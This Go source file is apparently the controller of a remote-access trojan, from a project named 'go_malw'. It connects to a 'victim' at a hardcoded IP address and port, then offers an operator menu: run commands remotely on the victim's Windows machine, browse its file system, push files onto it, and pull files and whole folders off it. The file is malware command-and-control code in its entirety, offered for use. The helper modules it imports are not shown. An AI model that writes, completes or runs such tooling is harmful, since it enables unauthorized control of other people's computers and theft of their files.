package main

import (
	"bufio"
	"fmt"
	"go_malw/server/core/Download"
	"go_malw/server/core/ExecuteCommandWindows"
	"go_malw/server/core/Move"
	"go_malw/server/core/Upload"
	"go_malw/server/core/handleConnection"
	"log"
	"net"
	"os"
	"strings"
)

type Data struct {
	Name string
	ID   int
	Age  float32
}

func options() {
	fmt.Println("	[1] ExecuteCommands")
	fmt.Println("	[2] Move in File System")
	fmt.Println("	[3] Upload Files")
	fmt.Println("	[4] Download Files")
	fmt.Println("	[5] Download Folders")
	fmt.Println("	[99] Exit")
	fmt.Println()
}

func DisplayError(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	var connection net.Conn

	IP := "192.168.178.86"
	//IP := "147.53.196.47"
	Port := "9090"

	connection, err := handleConnection.ConnectionWithVictim(IP, Port)

	if err != nil {
		log.Fatal(err)
	}

	defer connection.Close()
	fmt.Println("[+] Connection established with " + connection.RemoteAddr().String())

	reader := bufio.NewReader(os.Stdin)
	loopControl := true

	for loopControl {
		options()
		fmt.Printf("[+] Enter Options: ")
		user_input_raw, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
			continue
		}

		connection.Write([]byte(user_input_raw))
		user_input := strings.TrimSuffix(user_input_raw, "\n")

		switch {
		case user_input == "1":
			fmt.Println("[+] Commnad Execution Program")
			err := ExecuteCommandWindows.ExecuteCommandRemotelyWindows(connection)
			DisplayError(err)
		case user_input == "2":
			fmt.Println("[+] Navigating File System on Victim")
			err = Move.NavigateFileSystem(connection)
			DisplayError(err)
		case user_input == "3":
			fmt.Println("[+] Uploading Files")
			err = Upload.UploadFile2Victim(connection)
			DisplayError(err)
		case user_input == "4":
			fmt.Println("[+] Downloading Files")
			err = Download.DownloadFromVictim(connection)
			DisplayError(err)
		case user_input == "5":
			fmt.Println("[+] Downloading Folders")
			err = Download.DownloadFolderFromVictim(connection)
			DisplayError(err)
		case user_input == "99":
			fmt.Println("[+] Exiting the program")
			loopControl = false
		default:
			fmt.Println("[-] Invalid option, try again")
		}
	}
}
